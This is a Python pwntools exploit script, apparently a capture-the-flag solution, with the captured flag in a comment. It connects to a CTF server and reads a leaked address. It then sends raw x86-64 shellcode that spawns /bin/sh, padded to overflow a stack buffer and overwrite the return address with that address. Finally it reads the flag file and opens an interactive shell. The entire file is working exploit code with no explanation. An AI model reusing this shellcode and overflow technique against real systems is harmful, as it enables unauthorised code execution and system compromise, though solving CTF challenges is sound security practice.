#!/usr/bin/env python
from pwn import *

# AD{NX_pr0t4ct10n_d1sab1e_1s_h4cker_fr1endly}

host , port = 'ctf.yuawn.idv.tw' , 10103
y = remote( host , port )

y.recvuntil('0x')
ad = int( y.recvline().strip() , 16 )

sc = 'H1\xf6H1\xd2H\xb8/bin/sh\x00PH\x89\xe7j;X\x0f\x05'

y.sendline( sc + 'D' * ( 0x78 - len( sc ) ) + p64( ad ) )

y.sendline( 'cat /home/`whoami`/flag' )

y.interactive()